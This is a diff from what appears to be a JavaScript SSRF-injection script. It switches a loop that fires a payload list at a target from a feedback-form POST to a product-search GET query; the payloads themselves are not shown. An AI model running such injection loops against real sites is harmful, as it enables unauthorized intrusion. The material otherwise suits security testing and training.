@@ -49,11 +49,8 @@ async function basic1(targetURL){
     
     for (const payload of ssrf_payloads) {
         spinner.text = 'Basic SSRF Injection: ' + payload;
-        await http().post(targetURL + '/api/Feedbacks/',{
-            captcha: "-10",
-            captchaId: 2,
-            comment: payload,
-            rating: 2
+        await http().get(targetURL + '/rest/products/search',{
+            q: payload
             
         })
         await new Promise(r => setTimeout(r, 100));
